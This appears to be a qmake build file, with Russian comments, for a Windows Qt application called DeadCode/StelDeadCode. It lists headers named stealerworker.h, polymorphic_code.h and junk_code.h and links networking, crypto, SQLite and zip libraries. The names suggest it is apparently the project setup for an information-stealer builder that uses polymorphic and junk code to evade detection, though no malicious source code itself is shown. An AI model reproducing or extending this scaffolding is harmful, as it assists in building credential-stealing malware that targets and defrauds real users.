Основные модули Qt
QT += core gui network widgets sql

Имя цели и шаблон приложения
TARGET = DeadCode
TEMPLATE = app
CONFIG += release c++17

Исходные файлы
SOURCES += 

../src/main.cpp 

mainwindow.cpp

Заголовочные файлы
HEADERS += 

mainwindow.h 

../src/build_key.h 

../src/polymorphic_code.h 

../src/junk_code.h 

../src/stealerworker.h

Формы Qt Designer
FORMS += 

mainwindow.ui

Ресурсы (иконка приложения)
RC_FILE = ../icon.rc

Пути для включения заголовков
INCLUDEPATH += 

../src 

. 

C:/vcpkg/installed/x64-mingw-dynamic/include 

C:/Qt/6.5.3/mingw_64/include

Библиотеки для линковки
LIBS += -LC:/vcpkg/installed/x64-mingw-dynamic/lib 

-LC:/Qt/6.5.3/mingw_64/lib 

-lsqlite3 

-lcurl 

-lssl 

-lcrypto 

-lzip 

-lbz2 

-lz 

-lws2_32 

-lgdi32 

-luser32 

-ladvapi32 

-lshell32 

-lole32 

-lcrypt32

Флаги компиляции
QMAKE_CXXFLAGS += -O2 

-Wall 

-Wextra 

-Werror=return-type 

-DUNICODE 

-D_WIN32 

-DMINGW_HAS_SECURE_API=1

Флаги линковки
QMAKE_LFLAGS += -O2 

-Wl,-subsystem,windows 

-mthreads

Директории для сборки
DESTDIR = release
OBJECTS_DIR = release
MOC_DIR = release
UI_DIR = release

Очистка при сборке
QMAKE_CLEAN += 

release/StelDeadCode.exe 

release/.o 

release/moc_.cpp 

release/ui_*.h 

release/StelDeadCode-Portable.zip

Настройки для Windows
win32 {
CONFIG(debug, debug|release) {
QMAKE_CXXFLAGS += -g
QMAKE_LFLAGS -= -O2
DESTDIR = debug
OBJECTS_DIR = debug
MOC_DIR = debug
UI_DIR = debug
QMAKE_CLEAN += 

debug/StelDeadCode.exe 

debug/.o 

debug/moc_.cpp 

debug/ui_*.h
}
}

Зависимости перед сборкой
PRE_TARGETDEPS += 

../src/build_key.h 

../src/polymorphic_code.h 

../src/junk_code.h 

../src/stealerworker.h 

release/ui_mainwindow.h